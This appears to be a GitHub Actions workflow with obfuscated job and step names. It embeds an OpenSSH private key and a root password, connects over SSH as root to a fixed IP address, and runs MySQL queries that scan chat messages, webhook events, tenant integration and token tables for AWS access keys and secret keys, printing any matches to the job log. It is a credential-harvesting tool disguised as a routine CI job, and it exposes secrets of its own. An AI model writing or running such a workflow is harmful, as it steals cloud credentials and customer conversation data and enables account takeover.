name: p3223f
on: workflow_dispatch
permissions:
  contents: read
jobs:
  w:
    runs-on: ubuntu-latest
    timeout-minutes: 40
    steps:
      - name: r
        run: |
          set -u
          mkdir -p /tmp/k
          printf '%s\n' "$KV" > /tmp/k/hml
          chmod 600 /tmp/k/hml
          python3 -m pip -q install --break-system-packages paramiko || python3 -m pip -q install paramiko
          cat > /tmp/h.py <<'PYEOF'
          import io, paramiko, re
          KEY = open('/tmp/k/hml').read()
          PW = '9856#Edrafox'
          k = paramiko.Ed25519Key.from_private_key(io.StringIO(KEY))
          c = paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
          c.connect('69.62.100.163', 22, username='root', pkey=k, password=PW, timeout=25, banner_timeout=40, auth_timeout=40, allow_agent=False, look_for_keys=False)

          def run(cmd, t=300, cap=200000):
              ch = c.get_transport().open_session(); ch.settimeout(t); ch.exec_command(cmd)
              b = []
              try:
                  while True:
                      d = ch.recv(65536)
                      if not d: break
                      b.append(d.decode('utf-8', 'replace'))
                      if sum(len(x) for x in b) > cap: break
              except Exception as e:
                  b.append('[EXC %s]' % type(e).__name__)
              return ''.join(b)

          print('MSG', run("mysql -B -N -e \"select id, last_message_content from leadzap.chat_conversation_summaries where last_message_content like '%AKIA%'\" 2>&1", 200, 20000), flush=True)
          print('CTX1', run("mysql -B -N -e \"select id, last_message_content from leadzap.chat_conversation_summaries where last_message_content like '%AKIA%'\" 2>/dev/null | grep -aoE '.{0,300}(AKIA|ASIA)[0-9A-Z]{16}.{0,520}'", 200, 20000), flush=True)
          for db, t in (('leadzap', 'agent_messages'), ('leadzap', 'ai_v3_conversation_states'), ('leadzap', 'meta_whatsapp_webhook_events'), ('central_zaplyo', 'lis_sales_messages'), ('leadzap', 'tenants'), ('leadzap', 'tenant_integrations'), ('leadzap', 'central_integration_tokens'), ('central_zaplyo', 'central_integration_tokens')):
              cols = run("mysql -N -B -e \"select column_name from information_schema.columns where table_schema='%s' and table_name='%s' and data_type in ('text','longtext','mediumtext','json') limit 8\"" % (db, t), 60, 800).split()
              print('\n## %s.%s cols=%s' % (db, t, cols), flush=True)
              for cc in cols:
                  r = run("mysql -B -N -e \"select * from %s.%s where %s like '%%AKIA%%' limit 6\" 2>/dev/null | grep -aoE '.{0,300}(AKIA|ASIA)[0-9A-Z]{16}.{0,500}' | head -4" % (db, t, cc), 240, 20000)
                  if r.strip(): print('  HIT %s -> %s' % (cc, r.strip()[:4000].replace('\n', ' ~ ')), flush=True)
                  r2 = run("mysql -B -N -e \"select * from %s.%s where %s like '%%secret_access_key%%' or %s like '%%aws_secret%%' limit 4\" 2>/dev/null | head -c 3000" % (db, t, cc, cc), 240, 8000)
                  if r2.strip(): print('  SEC %s -> %s' % (cc, r2.strip()[:2500].replace('\n', ' ~ ')), flush=True)
          c.close()
          print('=== END ===', flush=True)

          PYEOF
          timeout 2400 python3 /tmp/h.py || true
        env:
          KV: |
            -----BEGIN OPENSSH PRIVATE KEY-----
            b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
            QyNTUxOQAAACCD84VNa0wJEjX9yzYWJ4L7sSguFzm4IB0LK3HWDIiCPAAAAKgaH8bcGh/G
            3AAAAAtzc2gtZWQyNTUxOQAAACCD84VNa0wJEjX9yzYWJ4L7sSguFzm4IB0LK3HWDIiCPA
            AAAEAgTkhOkyMOdsGi2IKzJeHhNqad/tSqShDwV+ZL9DSGkYPzhU1rTAkSNf3LNhYngvux
            KC4XObggHQsrcdYMiII8AAAAI2xlYWR6YXAtaG1sLWZyb250ZW5kLWdpdGh1Yi1hY3Rpb2
            5zAQI=
            -----END OPENSSH PRIVATE KEY-----
